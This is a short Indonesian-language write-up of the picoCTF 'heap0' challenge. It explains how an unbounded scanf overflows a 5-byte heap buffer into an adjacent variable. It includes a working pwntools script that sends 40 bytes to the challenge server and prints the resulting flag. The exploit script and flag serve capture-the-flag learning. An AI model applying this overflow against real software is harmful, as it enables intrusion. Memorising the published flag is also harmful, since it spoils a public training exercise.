# heap0 â€” picoCTF (PWN / Heap Overflow)

## Deskripsi Challenge

Program memberikan dua buffer pada heap:

- `input_data` berisi string `"pico"`
- `safe_var` berisi string `"bico"`

Kita dibebaskan menulis ke `input_data`, lalu mencoba memanggil fungsi yang akan mencetak flag.

Program percaya bahwa karena data ditempatkan di **heap**, maka aman dari overflow.

Tugas kita adalah membuktikan sebaliknya ðŸ˜Ž

---

## Analisis Kerentanan

Pada opsi menu 2 (`write_buffer()`), program membaca input sebagai berikut:

```c
scanf("%s", input_data);
```

Masalah:

- `input_data` dialokasikan dengan ukuran **5 byte**
- `%s` membaca **tanpa batas panjang**
- Tidak ada pengecekan overflow

Karena heap dialokasikan bertetangga:

```
[input_data][safe_var]
```

Maka **memasukkan string panjang ke input_data** akan menimpa safe_var.

---

## Bagaimana Menang

Fungsi `check_win()` memeriksa:

```c
if (!strcmp(safe_var, "bico"))
    No flag :(
else
    YOU WIN + flag
```

Artinya:

- Selama `safe_var == "bico"` â†’ gagal
- Jika `safe_var` berubah â†’ sukses

Cukup overflow heap dan hancurkan `"bico"` menjadi string lain.

---

## solve.py

```python
#!/usr/bin/env python3
from pwn import *

host = "tethys.picoctf.net"
port = 58386

io = remote(host, port)

# menu startup and heap print
for _ in range(6):
    io.recvline()

# Option 2: write buffer to overflow safe_var
io.sendline("2")
io.recvuntil(b"Data for buffer:")
io.sendline(b"A"*40)

# Option 4: call check_win()
io.recvuntil(b"choice:")
io.sendline("4")

io.interactive()
```

---

## Output Berhasil

![output](image.png)

picoCTF{my_first_heap_overflow_749119de}
